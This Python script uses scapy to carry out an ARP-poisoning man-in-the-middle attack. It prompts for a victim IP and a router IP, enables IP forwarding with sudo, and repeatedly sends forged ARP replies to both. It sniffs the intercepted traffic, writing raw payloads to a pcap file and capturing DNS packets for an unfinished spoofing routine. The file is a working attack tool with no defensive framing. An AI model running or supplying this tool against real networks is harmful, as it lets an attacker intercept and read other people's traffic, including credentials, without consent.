#!/usr/bin/env python3
# Authors: Matt Matero & Will Cusick
# Python Version: 3.5.2
from scapy.all import *
import atexit
import sys
import os
import time

last_session_filename = ".last_session"


def enable_ip_forwarding():
  print("[*] Enabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    result = os.system("sudo sysctl net.ipv4.ip_forward=1")
  elif sys.platform.startswith('darwin'):
    result = os.system("sudo sysctl net.inet.ip.forwarding=1")
  else:
    print("[!] Unsupported platform! Can't enable IP forwarding")
    raise NotImplementedError("Unsupported platform")

  if result > 0:
    print("[!] Error trying to enable IP forwarding")
    print("[!] Received Exit Status " + str(result))
    print("[!] Exiting...")
    # unregister disable_ip_forwarding since we know we didn't do it successfully
    atexit.unregister(disable_ip_forwarding)
    sys.exit(1)


# This will ensure we turn off IP forwarding for all "normal" modes of exiting.
# Including sys.exit(), KeyboardInterrupt, etc.
@atexit.register
def disable_ip_forwarding():
  print("[*] Disabling IP Forwarding...")
  if sys.platform.startswith('linux'):
    os.system("sudo sysctl net.ipv4.ip_forward=0")
  elif sys.platform.startswith('darwin'):
    os.system("sudo sysctl net.inet.ip.forwarding=0")
  else:
    print("[!] Unsupported platform! Can't disable IP forwarding")
    raise NotImplementedError("Unsupported platform")


def get_mac(IP):
  print('Getting MAC addr for: ' + IP)
  conf.verb = 0
  ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface)
  # keep requesting until we get response
  while len(unans) > 0:
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface)

  for snd, rcv in ans:
    return rcv.sprintf(r"%Ether.src%")


def reARP(gate_mac, victim_mac):
  print("[*] Restoring Targets...")
  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)


def trick(gate_mac, victim_mac):
  send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst=victim_mac))
  send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst=gate_mac))


def dns_spoof(dns_pkt):
  print(dns_pkt)
  #spoofed_sites = ['businessinsider.com'] # only spoof small set of websites

def sniffer(dns=False):
    if dns:
      pkt = sniff(iface=interface, filter='udp port 53',count=1)
      return pkt
    else:
      pkts = sniff(iface=interface, count=100,
                 prn=lambda x: x.sprintf(" Source: %IP.src% : %Ether.src%, \n"
                                         "%Raw.load% \n\n Reciever: %IP.dst% \n"
                                         "+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
      wrpcap("temp.pcap", pkts)


def parse_session_file():
  try:
    last_interface = ''
    last_victim_ip = ''
    last_gate_ip = ''
    last_session_path = os.path.join(sys.path[0], last_session_filename)
    with open(last_session_path, 'r') as f:
      line = f.readline()
      last_interface = line.strip()

      line = f.readline()
      last_victim_ip = line.strip()

      line = f.readline()
      last_gate_ip = line.strip()

      return last_interface, last_victim_ip, last_gate_ip
  except OSError:
    # If we fail trying to read, just continue as is
    return last_interface, last_victim_ip, last_gate_ip


def write_session_file(last_if, last_victim, last_gate):
  last_session_path = os.path.join(sys.path[0], last_session_filename)
  try:
    with open(last_session_path, 'w') as f:
      f.write(last_if + '\n')
      f.write(last_victim + '\n')
      f.write(last_gate + '\n')
  except OSError:
    # If we fail writing, fail silently
    pass


def mitm():
  try:
    victim_mac = get_mac(victim_ip)
    print(victim_mac)
  except Exception as e:
    print(e)
    print("[!] Couldn't Find Victim MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  try:
    gate_mac = get_mac(gate_ip)
    print(gate_mac)
  except Exception as e:
    print(e)
    print("[!] Couldn't Find Gateway MAC Address")
    print("[!] Exiting...")
    sys.exit(1)

  print("[*] Poisoning Targets...")
  run = True
  while run:
    try:
      trick(gate_mac, victim_mac)
      #sniffer()
      #pkt = sniffer(True) # grab single dns packet
      #print('mitm pkt: ')
      #print(pkt)
      #if DNS in pkt[0] and pkt[0][IP].src:
      #  print('Attempting DNS Spoof...')
      #  dns_spoof(pkt)
      time.sleep(1.5)
      dns_pkt = sniffer(True)
      dns_spoof(dns_pkt)
    except KeyboardInterrupt:
      reARP(gate_mac, victim_mac)
      print("[*] User Requested Shutdown")
      print("[*] Exiting...")
      return


if __name__ == '__main__':
  # Try to read info written from last session, so we can provide
  # defaults to the input.
  last_if, last_victim, last_gate = parse_session_file()

  try:
    if last_if:
      interface = input("[*] Enter Desired Interface ({}): ".format(last_if))
      if not interface:
        interface = last_if
    else:
      interface = input("[*] Enter Desired Interface: ")
    last_if = interface

    if last_victim:
      victim_ip = input("[*] Enter Victim IP ({}): ".format(last_victim))
      if not victim_ip:
        victim_ip = last_victim
    else:
      victim_ip = input("[*] Enter Victim IP: ")
    last_victim = victim_ip

    if last_gate:
      gate_ip = input("[*] Enter Router IP ({}): ".format(last_gate))
      if not gate_ip:
        gate_ip = last_gate
    else:
      gate_ip = input("[*] Enter Router IP: ")
    last_gate = gate_ip

    write_session_file(last_if, last_victim, last_gate)

    enable_ip_forwarding()
    mitm()
  except KeyboardInterrupt:
    print("[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(0)
